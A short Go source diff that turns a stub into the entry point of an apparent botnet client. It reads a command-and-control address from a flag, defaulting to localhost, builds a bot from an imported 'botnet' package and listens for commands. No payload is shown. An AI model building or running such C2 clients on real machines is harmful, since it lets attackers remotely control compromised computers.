@@ -1,13 +1,24 @@
 package main
 
-func main() {
-	sendData("127.0.0.1:7890")
-}
+import (
+	"flag"
+	"fmt"
+	"log"
 
-func sendData(addr string) {
-	// bot, err := botnet.NewBot(addr)
-	// if err != nil {
-	// 	log.Fatal(err)
-	// }
-	// bot.Listen()
+	"github.com/rodzzlessa24/botnet/tcp"
+)
+
+var (
+	ccAddrPtr = flag.String("ccaddr", "127.0.0.1:9090", "the full address of the command and control center")
+)
+
+func main() {
+	flag.Parse()
+
+	bot, err := tcp.NewBot(*ccAddrPtr)
+	if err != nil {
+		log.Panic(err)
+	}
+	bot.Listen()
+	fmt.Sprintln()
 }
